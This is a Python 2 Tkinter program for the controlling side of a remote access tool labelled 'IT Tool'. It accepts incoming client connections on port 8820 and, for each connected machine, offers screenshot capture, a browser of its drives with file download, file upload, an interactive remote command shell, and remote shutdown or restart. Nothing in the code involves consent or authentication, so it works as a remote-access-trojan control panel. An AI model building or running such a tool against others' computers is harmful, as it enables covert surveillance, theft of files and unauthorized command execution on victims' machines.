from Tkinter import *
import tkFont
import socket
import pickle
import functools
import threading
import tkFileDialog
import ttk
import os

WIDTH = 720
HEIGHT = 360
HOST = '0.0.0.0'
PORT = 8820
menu_bg = "#1976D2"
client_bg = "#BDBDBD"
icon = "cast.png.ico"
clients = {}


def center(win, f):
    """Centers the given window"""
    win.update_idletasks()
    if f:
        x = (win.winfo_screenwidth() // 2) - (WIDTH // 2)
        y = (win.winfo_screenheight() // 2) - (HEIGHT // 2)
        win.geometry('{}x{}+{}+{}'.format(WIDTH, HEIGHT, x, y))
    else:
        width = win.winfo_width()
        height = win.winfo_height()
        x = (win.winfo_screenwidth() // 2) - (width // 2)
        y = (win.winfo_screenheight() // 2) - (height // 2)
        win.geometry('{}x{}+{}+{}'.format(width, height, x, y))


def client_main(conn, host):
    """Create the main window of the client with all the options"""
    session = Tk()
    session.title(host)
    session.resizable(0, 0)
    session.focus_force()
    kk = Frame(session, width=430, height=50, bg=client_bg)
    kk.pack()
    center(session, False)
    B1 = Button(kk, text="Screenshot", command=lambda: screenshot(conn), bg=client_bg, activebackground=client_bg)
    B1.place(x=10, y=10)
    B3 = Button(kk, text="Download", command=lambda: download(conn), bg=client_bg, activebackground=client_bg)
    B3.place(x=90, y=10)
    B4 = Button(kk, text="Upload", command=lambda: upload(conn, host), bg=client_bg, activebackground=client_bg)
    B4.place(x=170, y=10)
    B5 = Button(kk, text="Shell", command=lambda: shell(conn, host), bg=client_bg, activebackground=client_bg)
    B5.place(x=233, y=10)
    B6 = Button(kk, text="Shutdown", command=lambda: conn.send('shutdown'), bg=client_bg, activebackground=client_bg)
    B6.place(x=285, y=10)
    B7 = Button(kk, text="Restart", command=lambda: conn.send('restart'), bg=client_bg, activebackground=client_bg)
    B7.place(x=365, y=10)
    session.iconbitmap(icon)
    session.mainloop()


def autoscroll(sbar, first, last):
    """Hide and show scrollbar as needed"""
    first, last = float(first), float(last)
    if first <= 0 and last >= 1:
        sbar.grid_remove()
    else:
        sbar.grid()
    sbar.set(first, last)


def populate_roots(tree, conn):
    """Create the root node"""
    dir = 'D:/'  # Can change to any path you want, that will be the root of the tree (the start)
    node = tree.insert('', 'end', text=dir, values=[dir, "directory"])  # Creates the root node of the tree
    populate_tree(tree, node, conn)


def populate_tree(tree, node, conn):
    """Start populating the tree"""
    if tree.set(node, "type") != 'directory':
        return

    tree.delete(*tree.get_children(node))
    dir = tree.set(node, 'fullpath').encode("utf-8")  # Returns the full path of the node
    conn.send(dir)
    elements = pickle.loads(conn.recv(5000000))
    for p in elements:
        fname = os.path.split(p[0])[1]  # The folder or file name to be displayed
        id = tree.insert(node, 'end', text=fname, values=[p[0], p[1]])  # Creates new node
        if p[1] == 'directory':  # This is required just for the plus icon to be displayed near folders
            tree.insert(id, 0, text="dummy")
            tree.item(id, text=fname)
        else:
            pass


def update_tree(conn, event):
    """If the plus was clicked, open the folder"""
    tree = event.widget
    populate_tree(tree, tree.focus(), conn)


def copy(conn, tree):
    """Download the given file from the client"""
    type = tree.set(tree.focus(), 'type')
    file = None
    if type != 'directory':
        conn.send('copy')
        file = tree.set(tree.focus(), 'fullpath')
        conn.send(pickle.dumps(file))
        sFileName = conn.recv(1024)
        conn.send("ok")
        sData = conn.recv(1024)
        fDownloadFile = open(sFileName, "wb")
        conn.settimeout(5)
        while sData:
            fDownloadFile.write(sData)
            try:
                sData = conn.recv(1024)
            except:
                break
        fDownloadFile.close()
        conn.settimeout(None)
    else:
        pass


def download(conn):
    """Display the client's directory tree"""
    conn.send('download')
    shl = Tk()
    shl.title('Choose a file to download')
    vsb = ttk.Scrollbar(shl, orient="vertical")
    tree = ttk.Treeview(shl, columns=("fullpath", "type"), displaycolumns='',
                        yscrollcommand=lambda f, l: autoscroll(vsb, f, l))
    vsb['command'] = tree.yview
    tree.heading("#0", text="Directory Structure", anchor='w')
    populate_roots(tree, conn)  # Start with C:/ folder
    tree.bind('<<TreeviewOpen>>', lambda event: update_tree(conn, event))  # If the plus was clicked (folder opened)
    tree.bind('<Double-Button-1>', lambda event: copy(conn, tree))  # If a file was doubled clicked (start download)
    tree.grid(column=0, row=0, sticky='nswe')
    vsb.grid(column=1, row=0, sticky='ns')
    center(shl, False)  # Center the window
    shl.grid_columnconfigure(0, weight=1)
    shl.grid_rowconfigure(0, weight=1)
    shl.protocol("WM_DELETE_WINDOW", functools.partial(closing, param=(conn, shl)))  # If the 'x' button was clicked
    shl.iconbitmap(icon)
    shl.mainloop()


def upload(conn, host):
    """Upload a file to the client"""
    conn.send("upload")
    sFileName = tkFileDialog.askopenfilename(initialdir="C:/", title=host,
                                                filetypes=(("jpeg files", "*.jpg"), ("all files", "*.*")))
    if sFileName == '':
        conn.send('abort')
    else:
        conn.send(str(sFileName.rsplit("/", 1)[-1]))  # slicing and keeping only the file name and extension
        ok = conn.recv(1024)
        fUploadFile = open(sFileName, "rb")
        sRead = fUploadFile.read(1024)
        while sRead:
            conn.send(sRead)
            sRead = fUploadFile.read(1024)
        print "Send completed"
        fUploadFile.close()


def screenshot(conn):
    """Take a screenshot of the client's screen"""
    conn.send("screenshot")
    output = pickle.loads(conn.recv(500000000))
    output.show()


def shell(conn, host):
    """Create the shell window"""
    conn.send('shell')
    shl = Tk()
    shl.title(host)
    shl.iconbitmap(icon)
    cmd = Frame(shl, width=WIDTH, height=HEIGHT, bg='black')
    center(shl, True)
    lb = Label(shl, bd=0, bg='black', fg='white')
    inp = Entry(cmd, bg='black', bd=0, fg='white', width=120)
    shell_scroll = Scrollbar(shl)
    shell_scroll.pack(side=RIGHT, fill=Y)
    cmd_list = Text(shl, yscrollcommand=shell_scroll.set, height=21, width=87, bg='black', bd=0, fg='white')
    cmd_list.bindtags((cmd_list, shl, "all"))
    cmd_list.place(x=0, y=0)
    shell_scroll.config(command=cmd_list.yview)
    cwd = str(conn.recv(1024)) + '>'  # Get the current working directory
    lb.config(text=cwd)
    inp.focus_force()
    inp.bind('<Return>', lambda event: shell_enter(conn, lb, inp, cmd_list, shl))  # Bind the enter key
    lb.place(x=0, y=343)
    inp.place(x=lb.winfo_reqwidth(), y=343)
    cmd.pack()
    shl.protocol("WM_DELETE_WINDOW", functools.partial(closing, param=(conn, shl)))  # If the 'x' button was clicked
    shl.iconbitmap(icon)
    shl.after(150,)


def closing(param):
    """Function that gets the current window and closes it"""
    conn, shl = param
    conn.send('exit')
    shl.destroy()


def shell_enter(conn, lb, inp, cmd_list, shl):
    """When hit enter in the shell, execute the command"""
    string = inp.get()
    if string != 'exit':
        conn.send(string)  # Send the command to the client to execute
        msg = conn.recv(50000)
        cmd_list.insert(END, str(msg + '\n\n'))  # Paste the output of the command
        inp.delete(0, END)
        cwd = str(conn.recv(1024)) + '>'  # Get the current working directory
        lb.config(text=cwd)
        inp.place(x=lb.winfo_reqwidth(), y=343)
        cmd_list.see('end')
        shl.after(150,)
    else:
        conn.send(string)
        shl.destroy()


def if_double_clicked(c_list):
    """If the client was double clicked, start the session"""
    ip = c_list.get(c_list.curselection()[0]).split(" ", 1)[0]
    client_main(clients[ip], ip)


def client_conn(s):
    """Waits for client connections"""
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        (conn, addr) = s.accept()
        conn.send('info')
        info = pickle.loads(conn.recv(1024))  # Get all the necessary info about the client
        clients[info[0]] = conn
        c_list.bind('<Double-1>', lambda event: if_double_clicked(c_list))  # Bind double click to the list of clients
        root.after(150, lambda: c_list.insert(END, info[0].ljust(35) + info[1].ljust(35) + info[3].ljust(
            30) + "Click to start session"))


#
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
t = threading.Thread(target=client_conn, args=(s,))  # A thread that waits for client connections in the background
t.setDaemon(True)
t.start()

# Create the main tk window
root = Tk()
root.title("IT Tool")
root.resizable(0, 0)
helv14 = tkFont.Font(family="Helvetica", size=14, weight="bold")
helv12 = tkFont.Font(family="Helvetica", size=12)
w = Frame(root, width=WIDTH, height=HEIGHT, bg=menu_bg)
center(root, True)
L1 = Label(root, text="Connected clients:", font=helv14, bd=0, bg=menu_bg)
L1.place(x=25, y=10)
iplabel = Label(root, text="IP", bd=0, font=helv12, bg=menu_bg)
iplabel.place(x=77, y=55)
maclabel = Label(root, text="MAC", bd=0, font=helv12, bg=menu_bg)
maclabel.place(x=215, y=55)
hlabel = Label(root, text="Host Name", bd=0, font=helv12, bg=menu_bg)
hlabel.place(x=325, y=55)

scrollbar = Scrollbar(root)
scrollbar.pack(side=LEFT, fill=Y)

c_list = Listbox(root, yscrollcommand=scrollbar.set, height=16, width=90, bd=0)
c_list.place(x=50, y=90)
scrollbar.config(command=c_list.yview)
c_list.focus_force()
w.pack()
root.iconbitmap(icon)
root.mainloop()

while raw_input() != 'exit':
    pass
s.close()
